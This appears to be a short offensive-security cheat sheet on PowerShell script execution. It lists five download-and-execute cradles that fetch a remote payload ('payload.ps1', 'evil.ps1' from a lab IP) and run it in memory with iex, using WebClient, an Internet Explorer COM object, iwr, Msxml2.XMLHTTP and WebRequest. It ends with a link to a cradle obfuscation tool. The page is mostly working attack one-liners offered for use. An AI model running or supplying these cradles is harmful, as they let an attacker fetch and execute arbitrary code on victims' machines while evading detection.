# Powershell - Script Execution

* **Download-execute cradle**

{% code fullWidth="true" %}
```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```
{% endcode %}

<pre class="language-powershell"><code class="lang-powershell"><strong>$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1
</strong>');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
</code></pre>

#### PSv3 in poi

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText
```

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

{% embed url="https://github.com/danielbohannon/Invoke-CradleCrafter" %}

